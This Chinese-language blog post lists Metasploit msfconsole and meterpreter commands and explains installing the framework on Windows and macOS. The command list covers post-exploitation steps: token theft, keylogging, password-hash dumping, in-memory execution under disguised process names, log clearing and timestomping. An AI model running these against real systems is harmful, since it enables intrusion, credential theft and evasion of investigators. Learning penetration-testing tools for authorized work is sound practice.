## 前言

在平时做项目的时候，每次开启虚拟机使用会很不方便，配置低的电脑后台开多了还会出现卡顿现象。主要还是在本地安装使用更加的方便快捷，提高了效率。也可以部署在vps等，方便对内网进行渗透。

## msfconsole命令

    
    
    show exploits
    列出metasploit框架中的所有渗透攻击模块。
    
    show payloads
    列出metasploit框架中的所有攻击载荷。
    
    show auxiliary
    列出metasploit框架中的所有辅助攻击载荷。
    
    search name
    查找metasploit框架中所有的渗透攻击和其他模块。
    
    info
    展示出制定渗透攻击或模块的相关信息。
    
    use name
    装载一个渗透攻击或模块。
    
    LHOST
    你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。
    
    RHOST
    远程主机或是目标主机。
    
    set function
    设置特定的配置参数（EG：设置本地或远程主机参数）。
    
    setg function
    以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。
    
    show options
    列出某个渗透攻击或模块中所有的配置参数。
    
    show targets
    列出渗透攻击所有支持的目标平台。
    
    set target num
    指定你所知道的目标的操作系统以及补丁版本类型。
    
    set payload name
    指定想要使用的攻击载荷。
    
    show advanced
    列出所有高级配置选项。
    
    set autorunscript migrate -f.
    在渗透攻击完成后，将自动迁移到另一个进程。
    
    check
    检测目标是否选定渗透攻击存在相应的安全漏洞。
    
    exploit
    执行渗透攻击或模块来攻击目标。
    
    exploit -j
    在计划任务下进行渗透攻击（攻击将在后台进行）。
    
    exploit -z
    渗透攻击完成后不与回话进行交互。
    
    exploit -e encoder
    制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。
    
    exploit -h
    列出exploit命令的帮助信息。
    
    sessions -l
    列出可用的交互会话（在处理多个shell时使用）。
    
    sessions -l -v
    列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。
    
    sessions -s script
    在所有活跃的metasploit会话中运行一个特定的metasploit脚本。
    
    sessions -K
    杀死所有活跃的交互会话。
    
    sessions -c cmd
    在所有活跃的metasploit会话上执行一个命令。
    
    sessions -u sessionID
    升级一个普通的win32 shell到metasploit shell。
    
    db_create name
    创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。
    
    db_connect name
    创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。
    
    db_namp
    利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。
    
    db_autopwn -h
    展示出db_autopwn命令的帮助信息。
    
    db_autopwn -p -r -e
    对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。
    
    db_destroy
    删除当前数据库。
    
    db_destroy user：passwd@host：port/database
    使用高级选项来删除数据库。
    

## metasploit命令

    
    
    help
    打开meterpreter使用帮助。
    
    run scriptname
    运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。
    
    sysinfo
    列出受控主机的系统信息。
    
    ls
    列出目标主机的文件和文件夹信息。
    
    use priv
    加载特权提升扩展模块，来扩展metasploit库。
    
    ps
    显示所有运行的进程以及相关联的用户账户。
    
    migrate PID
    迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。
    
    use incognito
    加载incognito功能（用来盗窃目标主机的令牌或假冒用户）
    
    list_tokens -u
    列出目标主机用户的可用令牌。
    
    list_tokens -g
    列出目标主机用户组的可用令牌。
    
    impersonate_token DOMAIN_NAME\USERNAME
    假冒目标主机上的可用令牌。
    
    steal_token PID
    盗窃给定进程的可用令牌并进行令牌假冒。
    
    drop_token
    停止假冒当前令牌。
    
    getsystem
    通过各种攻击向量来提升系统用户权限。
    
    execute -f cmd.exe -i
    执行cmd.exe命令并进行交互。
    
    execute -H -i -f cmd.exe 
    以所有可用令牌来执行cmd命令并隐藏该进程加参数-H。
    
    execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt"
    在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。
    -d 在目标主机执行时显示的进程名称（用以伪装）
    -m 直接从内存中执行
    "-o wce.txt"是wce.exe的运行参数
     
    rev2self
    回到控制目标主机的初始用户账户下。
    
    reg command
    在目标主机注册表中进行交互，创建，删除，查询等操作。
    
    setdesktop number
    切换到另一个用户界面（该功能基于那些用户已登录）。
    
    screenshot
    对目标主机的屏幕进行截图。
    
    upload file
    向目标主机上传文件。
    
    download file
    从目标主机下载文件。
    
    keyscan_start
    针对远程目标主机开启键盘记录功能。
    
    keyscan_dump
    存储目标主机上捕获的键盘记录。
    
    keyscan_stop
    停止针对目标主机的键盘记录。
    
    keyscan_dump
    显示捕捉到的键盘记录信息
    
    getprivs
    尽可能多的获取目标主机上的特权。
    
    uictl enable keyboard/mouse
    接管目标主机的键盘和鼠标。
    
    background
    将你当前的metasploit shell转为后台执行。
    
    hashdump
    导出目标主机中的口令哈希值。
    
    use sniffer
    加载嗅探模式。
    
    sniffer_interfaces
    列出目标主机所有开放的网络端口。
    
    sniffer_dump interfaceID pcapname
    在目标主机上启动嗅探。
    
    sniffer_start interfaceID packet-buffer
    在目标主机上针对特定范围的数据包缓冲区启动嗅探。
    
    sniffer_stats interfaceID
    获取正在实施嗅探网络接口的统计数据。
    
    sniffer_stop interfaceID
    停止嗅探。
    
    add_user username password -h ip
    在远程目标主机上添加一个用户。
    
    clearev
    清除目标主机上的日志记录。
    
    timestomp
    修改文件属性，例如修改文件的创建时间（反取证调查）。
    
    search –f aa.txt
    为查看目标机中在当前目录以及当前目录的子目录中有没有aa.txt这个文件，若有则显示出其路径。
    
    portfwd  add -l 4444 -p 3389 -r 192.168.1.102
    -l <opt>要监听的本地端口
    -p <opt>连接到的远程端口
    -r <opt>要连接到的远程主机
    端口转发,本机监听4444,把目标机3389转到本机4444（用于把对方3389端口转到本机，这样就可以进行远程连接）
    
    rdesktop -u Administrator -p bk#123 127.0.0.1:4444
    使用rdesktop来连接桌面，-u 用户名 -p 密码
    
    netstat -an | grep“4444" 
    查看指定端口开放情况
    
    run get_local_subnets
    目标主机的内网IP段情况
    
    route add 192.168.1.0 255.255.255.0 
    添加动态路由
    
    route print
    输出路由表
    
    reg
    与受害人的注册表进行交互
    
    shell
    获取控制台权限
    
    reboot
    重启目标主机。
    

## msfvenom

介绍和常用方法在我的另外一篇文章中：  
<https://www.yuque.com/yuqueyonghupw6iq3/nipewo/hk7n8x>

## Windows下的安装

访问下载地址：  
<https://windows.metasploit.com/>  
![image.png](https://image.3001.net/images/20220308/1646707455_6226c2ff5b88efbb2c30a.png!small)  
解压后直接进行安装  
![image
\(1\).png](https://image.3001.net/images/20220308/1646707509_6226c335a7bf84195f5d3.png!small)  
我这里安装在D盘，配置环境变量：D:\metasploit-framework\bin  
![image.png](https://image.3001.net/images/20220308/1646707579_6226c37b2726038e7a956.png!small)  
在终端输入msfconsole或者使用msfvenom  
![image-1.png](https://image.3001.net/images/20220308/1646707833_6226c4796e7ad33effd11.png!small)

## Linux下的安装

需要在Linux安装的小伙伴可以参考下别人的安装方法，链接地址如下：  
<https://www.yuque.com/yuqueyonghupw6iq3/nipewo/hk7n8x>  
<https://cloud.tencent.com/developer/article/1711901>

## Mac下的安装

打开macOS的下载地址：  
<https://osx.metasploit.com/>  
![image-1.png](https://image.3001.net/images/20220308/1646707943_6226c4e78151fb8fd630a.png!small)  
双击pkg包，直接安装即可  
![image-2.png](https://image.3001.net/images/20220308/1646707965_6226c4fd611d9943bc317.png!small)  
macOS 下 Metasploit 的可执行文件的位置为：  
/opt/metasploit-framework/bin  
使用tree视图效果看起来比较舒服，Mac安装方法：

    
    
    brew install tree
    
    
    
    /opt/metasploit-framework/bin
    ├── msfbinscan
    ├── msfconsole
    ├── msfd
    ├── msfdb
    ├── msfelfscan
    ├── msfmachscan
    ├── msfpescan
    ├── msfremove
    ├── msfrop
    ├── msfrpc
    ├── msfrpcd
    ├── msfupdate
    └── msfvenom
    

### 设置变量

可以直接在zsh配置文件下配置 msf 路径的环境变量:

    
    
    vim ~/.zshrc
    

添加以下内容：

    
    
    export PATH="$PATH:/opt/metasploit-framework/bin"
    

刷新下zsh就能正常使用metasploit的各种命令

    
    
    zsh
    

### 使用

启动msfconsole,设置用户名和密码均是msf  
macOS 安装的 Metasploit 自带 Web Servive:  
<https://localhost:5443/api/v1/auth/account>  
![image-4.png](https://image.3001.net/images/20220308/1646708587_6226c76b4700387e6417f.png!small)  
使用上面设置好的密码  
![image-5.png](https://image.3001.net/images/20220308/1646708606_6226c77e901b7e93335bf.png!small)  
![image-6.png](https://image.3001.net/images/20220308/1646708624_6226c7901638544481a79.png!small)  
![image-7.png](https://image.3001.net/images/20220308/1646708638_6226c79ea30e920eecbf4.png!small)  
在下次使用msfconsole时重新输入username和password=msf:msf就可以使用了。

## 结束语

整个过程也不复杂，主要还是进行简单的分享吧～

